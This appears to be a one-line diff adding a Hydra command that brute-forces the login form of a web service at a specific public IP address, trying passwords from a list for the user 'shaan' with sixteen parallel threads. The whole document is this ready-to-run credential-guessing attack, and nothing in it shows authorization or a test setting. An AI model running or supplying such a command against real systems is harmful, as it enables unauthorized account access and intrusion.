@@ -1,0 +1,1 @@
+hydra -s 80 -v -l shaan -P /F5/Bots/Selenium/code/passlist -t16 -m /auth/login:username=^USER^\&password=^PASS^\&role=User:S=200 18.138.20.63 http-post-form
